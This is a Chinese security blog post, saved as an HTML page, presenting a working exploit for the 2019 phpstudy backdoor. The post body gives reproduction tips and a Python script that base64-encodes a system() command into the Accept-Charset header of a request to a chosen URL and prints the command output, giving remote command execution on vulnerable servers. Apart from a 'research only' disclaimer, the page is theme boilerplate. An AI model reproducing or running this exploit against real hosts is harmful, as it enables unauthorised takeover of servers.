@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/logo.ico">
+  <title>phpstudy后门exp | 松鼠A的博客</title>
+  <meta name="author" content="sshuo" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="前阵子phpstudy爆了后门，网络安全周爆的呢 影响版本phpstudy 2016版PHP5.4 据说官网phpstudy2018版php-5.2.17和php-5.4.45也有，未实测 据传言这个也存在  现在网上着分析消息一般就三种，一种是新闻报道，一种是逆向研究，还有就是exp 看了很多个exp代码又复杂又不好用，最后决定自己写一个试试 看了看其实就是报文里有两个属性字段被修改了，其他正常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpstudy后门exp">
+<meta property="og:url" content="http://shiyeshu.github.io/2019/09/25/phpstudy%E5%90%8E%E9%97%A8exp/index.html">
+<meta property="og:site_name" content="松鼠A的博客">
+<meta property="og:description" content="前阵子phpstudy爆了后门，网络安全周爆的呢 影响版本phpstudy 2016版PHP5.4 据说官网phpstudy2018版php-5.2.17和php-5.4.45也有，未实测 据传言这个也存在  现在网上着分析消息一般就三种，一种是新闻报道，一种是逆向研究，还有就是exp 看了很多个exp代码又复杂又不好用，最后决定自己写一个试试 看了看其实就是报文里有两个属性字段被修改了，其他正常">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://shiyeshu.github.io/images/logo.ico">
+<meta property="article:published_time" content="2019-09-25T08:41:00.000Z">
+<meta property="article:modified_time" content="2021-05-17T09:28:27.065Z">
+<meta property="article:author" content="sshuo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://shiyeshu.github.io/images/logo.ico">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/light.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>归档</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>友链</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/about/me.html">关于我</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/shiyeshu">个人项目</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">松鼠A的博客</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>松鼠A的博客</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        <section class="col-md-8">
+    <article>
+        <div class="kratos-hentry kratos-post-inner clearfix">
+            <header class="kratos-entry-header">
+                <h1 class="kratos-entry-title text-center">phpstudy后门exp</h1>
+                
+                <ul class="kratos-post-meta text-center">
+                    <li><i class="fa fa-calendar"></i> 2019-09-25</li>
+                    <li><i class="fa fa-user"></i> 作者 sshuo</li>
+                    <li>
+                        <i class="fa fa-edit"></i> 
+                        
+                        
+                            1246
+                        
+                        字
+                    </li>
+                    
+                </ul>
+            </header>
+            <div class="kratos-post-content">
+                <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                    本文最后编辑于 <time datetime="1621243707065"></time> 前，其中的内容可能需要更新。
+                </div>
+                
+                <hr />
+                <p>前阵子phpstudy爆了后门，网络安全周爆的呢</p>
+<p>影响版本phpstudy 2016版PHP5.4</p>
+<p>据说官网phpstudy2018版php-5.2.17和php-5.4.45也有，未实测</p>
+<p>据传言这个也存在</p>
+<p><img src="/images/2019/09/4256490006.png"></p>
+<p>现在网上着分析消息一般就三种，一种是新闻报道，一种是逆向研究，还有就是exp</p>
+<p>看了很多个exp代码又复杂又不好用，最后决定自己写一个试试</p>
+<p>看了看其实就是报文里有两个属性字段被修改了，其他正常发包即可</p>
+<p>首先用burp试了试，复现失败，没有返回命令内容</p>
+<p>后来无意中发现把Accept-Encoding后面属性deflate最前面的空格去掉即可</p>
+<p>命令：<span style="background-color: rgb(241, 241, 241); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 1em; white-space: pre-wrap;">echo “111111111111111”;</span></p>
+<p><img src="/images/2019/09/3271259473.png"></p>
+<p>（1处deflate前面去掉一个空格，2处为命令内容b64编码）</p>
+<p>复现成功</p>
+<p>python写一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests,base64,sys</span><br><span class="line">def go(url):</span><br><span class="line">	if &#39;http&#39; not in url:</span><br><span class="line">		url &#x3D; &#39;http:&#x2F;&#x2F;&#39;+url</span><br><span class="line">	else:</span><br><span class="line">		a &#x3D; input(&#39;请输入指令\n&#39;)</span><br><span class="line">		b &#x3D; &#39;system(&quot;%s&quot;);&#39; %a</span><br><span class="line">		c &#x3D; base64.b64encode(b.encode(&#39;utf-8&#39;))</span><br><span class="line">		payload &#x3D; (str(c,&#39;utf-8&#39;))</span><br><span class="line">		headers &#x3D; &#123;</span><br><span class="line">	                &#39;Accept-Encoding&#39;:&#39;gzip,deflate&#39;,</span><br><span class="line">	                &#39;Accept-Charset&#39;:payload</span><br><span class="line">	            &#125;</span><br><span class="line">		send &#x3D; requests.get(url&#x3D;url,headers&#x3D;headers,timeout&#x3D;10)</span><br><span class="line">		if send.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			print(&#39;发送成功&#39;)</span><br><span class="line">			print(send.text)</span><br><span class="line">		else:</span><br><span class="line">			print(&#39;执行失败，可能后门不存在&#39;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	t&#x3D;input(&#39;请输入url\n&#39;)</span><br><span class="line">	go(t)</span><br></pre></td></tr></table></figure>
+
+<p>直接运行系统命令</p>
+<p>但是这个后门本质是运行php代码</p>
+<p>因为我写的第八行所以只跑了系统命令</p>
+<p>输出部分本来想美化，后来发现会影响回显遂放弃<br><a target="_blank" rel="noopener" href="https://github.com/shiyeshu/phpstudy_exp">github</a></p>
+<p>本文章已经所附代码仅供技术研究，请勿用于其他用途</p>
+
+            </div>
+            
+            <footer class="kratos-entry-footer clearfix">
+                
+                    <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                    
+                    
+                        <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                        <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://shiyeshu.github.io/2019/09/25/phpstudy%E5%90%8E%E9%97%A8exp/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://shiyeshu.github.io/2019/09/25/phpstudy%E5%90%8E%E9%97%A8exp/";
+            const title         = "「phpstudy后门exp」";
+            const excerpt       = `前阵子phpstudy爆了后门，网络安全周爆的呢
+影响版本phpstudy 2016版PHP5.4
+据说官网phpstudy2018版php-5.2.17和php-5.4.45也有，未实测
+据传言这个也存在
+
+现在网上着分析消息一般就...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                    
+                    </div>
+                
+                <div class="footer-tag clearfix">
+                    <div class="pull-left">
+                    <i class="fa fa-tags"></i>
+                        
+                    </div>
+                    <div class="pull-date">
+                    <span>最后编辑：2021-05-17</span>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        
+            <nav class="navigation post-navigation clearfix" role="navigation">
+                
+                <div class="nav-previous clearfix">
+                    <a title=" phpstudy中Apache无法启动问题" href="/2019/07/12/phpstudy中Apache无法启动问题/">&lt; 上一篇</a>
+                </div>
+                
+                
+                <div class="nav-next clearfix">
+                    <a title=" 学习副产物--编码助手（本地编码小工具）" href="/2020/01/13/学习副产物--编码助手（本地编码小工具）/">下一篇 &gt;</a>
+                </div>
+                
+            </nav>
+        
+        
+    </article>
+</section>
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.jpg" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2021/05/17/hello-world%20-%20%E5%89%AF%E6%9C%AC%20(2)%20-%20%E5%89%AF%E6%9C%AC/"><i class="fa  fa-book"></i> Hello World</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/05/17/%EF%BC%88%E4%B8%A2%E5%A4%B1%E6%96%87%E7%AB%A0%EF%BC%89%E5%89%91%E9%B1%BCBBS%E5%90%8E%E5%8F%B0XSS%E7%BB%84%E5%90%88%E6%8B%B3%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6/"><i class="fa  fa-book"></i> （丢失文章）剑鱼BBS后台XSS组合拳获取数据库文件</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2020/10/14/%EF%BC%88%E4%B8%A2%E5%A4%B1%E6%96%87%E7%AB%A0%EF%BC%89VMware-vCenter_poc/"><i class="fa  fa-book"></i> VMware-vCenter_poc</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2020/09/22/%E5%88%9D%E6%8E%A2%E5%9F%BA%E4%BA%8Ewindows%E4%B8%BB%E9%A2%98%E7%9A%84%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"><i class="fa  fa-book"></i> 初探基于windows主题的哈希传递攻击</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2020/08/26/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFpma%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%AA%8C%E8%AF%81POC/"><i class="fa  fa-book"></i> 宝塔面板pma未授权访问验证POC</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="me" href="https:///@www.sshuo.cc"><i class="fa fa fa-share-alt-square"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/shiyeshu"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2021 松鼠A的博客 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by sshuo.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+<script async src="/js/candy.min.js"></script>
+
+    <script defer src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="song"
+        id="1426844352"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
